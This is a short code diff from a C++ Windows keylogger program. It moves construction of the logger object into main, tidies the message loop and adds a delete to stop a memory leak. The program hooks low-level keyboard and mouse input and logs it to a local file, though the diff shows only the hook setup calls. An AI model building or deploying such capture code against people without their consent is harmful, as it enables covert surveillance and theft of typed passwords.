@@ -288,7 +288,8 @@ class KeyLogger {
 };
 
 
-KeyLogger* KeyLogger_obj = new KeyLogger(".\\Keylogger.log");
+//KeyLogger* KeyLogger_obj = new KeyLogger(".\\Keylogger.log");
+KeyLogger* KeyLogger_obj;
 
 
 LRESULT CALLBACK KeyLogger::LowLvlKeybdHookCallback(int nCode, WPARAM wParam, LPARAM lParam)
@@ -325,6 +326,8 @@ LRESULT CALLBACK KeyLogger::LowLvlMouseHookCallback(int nCode, WPARAM wParam, LP
 
 int main()
 {
+	KeyLogger_obj = new KeyLogger(".\\Keylogger.log");
+	
 	// setting hooks
 	KeyLogger_obj->SetLowLvLKeybdHook();
 	KeyLogger_obj->SetLowLvlMouseHook();
@@ -334,12 +337,16 @@ int main()
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
 		TranslateMessage(&msg);
-        DispatchMessage(&msg);
+		DispatchMessage(&msg);
 	}
 
 	// releasing hooks
 	KeyLogger_obj->ReleaseLowLvlKeybdHook();
 	KeyLogger_obj->ReleaseLowLvlMouseHook();
 
+	// deleting object to avoid memory leak if gone out of scope.	
+	// might still leak if exception occurs between creation and deletion. deal with it later. 
+	delete KeyLogger_obj; 	
+	
 	return 0;
 }
